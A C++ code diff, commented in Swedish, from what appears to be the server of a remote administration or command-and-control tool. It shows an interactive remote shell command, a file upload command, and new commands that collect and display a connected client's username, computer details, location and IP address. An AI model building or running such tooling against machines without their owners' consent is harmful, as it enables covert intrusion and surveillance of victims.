@@ -188,7 +188,7 @@ func_map server::get_client_commands()
 			}, args, "upload");
 		} },
 
-		{"shell-process", [&](std::string args) {
+		{"shell-process", [&](std::string args) { // skapa en shell interaktiv shell på klienten
 			std::string shell = args;
 			std::string cwd = R"(C:\Windows\System32)";
 			message msg{ "shell-init", "" };
@@ -298,17 +298,62 @@ func_map server::get_client_commands()
 			}
 		}},
 
-		{ "get-info", [&](std::string args){
-			for (auto& [key, value] : attached->computer_information) {
-				if (send(*attached, {"info", key})) {
-					packet response = wait_response("response|info", attached);
+		{"get-info", [&](std::string args){ // begär information från klienten
+			for (auto& [information_type, information_dict] : attached->information) { // loopa genom informations kategorierna
+				for (auto& [key, value] : information_dict) { // loopa genom informations queries
+					if (send(*attached, { "info", key })) { // skicka query
+						packet response = wait_response("response|info", attached); // vänta på svar
+						if (response.id.empty() || response.data.empty()) {
+							console << "(Status) Failed: Client Disconnected\n";
+							return;
+						}
 
-					console_log.Log<LOG_VERBOSE>(logger() << str_time() << " request-info(" << key << ") => " << response.data << "\n");
-					console << str_time() << " request-info(" << key << ") => " << response.data << "\n";
+						std::string response_string = response.data;
+						console_log.Log<LOG_INFO>(logger() << str_time() << " request-info(" << key << ") => " << response_string << "\n");
 
-					delete_packet(response);
+						value = response_string; // sätt map värdet för querien till svars värdet tex {"Username", ""} => query = ["Username"] svar = ["dfssf"] => {"Username", "dfssf"} 
+
+						delete_packet(response); // ta bort svaret
+					}
+					console_log.draw_element();
 				}
 			}
+			console << "(Status) Success: Got information\n";
+		}},
+
+		{ "show-info", [&](std::string args) { // visa akumulerad information om klienten
+			argument_handler(
+			{
+				{"connection", [&](std::string value){
+					console << "{\n" <<
+						"  Ip Address: " << attached->ip_address << "\n" <<
+						"  Socket Id : " << std::to_string(attached->socket_id) << "\n}\n";
+				}},
+				{"computer",[&](std::string value){
+					console << "{\n";
+					utility::print_map(attached->information["computer"], "  ", ": ", "\n", console);
+					console << "}\n";
+				}},
+				{"location",[&](std::string value){
+					console << "{\n";
+					utility::print_map(attached->information["location"], "  ", ": ", "\n", console);
+					console << "}\n";
+				}},
+				
+				{"all", [&](std::string) {
+					console << "{\n" <<
+						" Connection {\n" <<
+						"  Ip Address: " << attached->ip_address << "\n" <<
+						"  Socket Id : " << std::to_string(attached->socket_id) << 
+						"  \n},\n\n  Computer {\n\n";
+
+					utility::print_map(attached->information["computer"], "    ", ": ", "\n", console);
+					console << "\n  },\n\n  Location {\n\n";
+					utility::print_map(attached->information["location"], "    ", ": ", "\n", console);
+					console << "\n  }\n\n}\n\n";
+				}}
+
+			}, args, "show-info");
 		}}
 
 	};
